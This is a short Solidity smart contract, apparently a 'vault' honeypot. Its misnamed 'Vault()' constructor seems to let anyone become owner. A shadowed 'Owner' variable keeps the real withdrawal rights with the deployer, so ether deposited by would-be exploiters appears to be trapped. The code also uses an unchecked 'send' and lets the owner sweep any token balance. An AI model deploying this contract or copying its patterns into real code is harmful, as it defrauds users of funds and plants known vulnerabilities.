pragma solidity ^0.4.7;

contract ForeignToken {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint256 amount) public;
}

contract Owned {
    bool public locked = true;
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner || !locked) _; }
    function lock(bool flag) onlyOwner { locked = flag; }
}

contract Deposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;

    event Deposit(uint amount);
    event Withdraw(uint amount);
    
    function Vault() payable {
        Owner = msg.sender;
        deposit();
    }
    
    function() payable {
        deposit();
    }

    function deposit() payable {
        if (msg.value >= 0.1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposit(msg.value);
        }
    }

    function kill() payable {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.send(amount);
            Withdraw(amount);
        }
    }
    
    function withdrawToken(address token, uint amount) payable onlyOwner {
        uint bal = ForeignToken(token).balanceOf(address(this));
        if (bal >= amount) {
            ForeignToken(token).transfer(msg.sender, amount);
        }
    }
}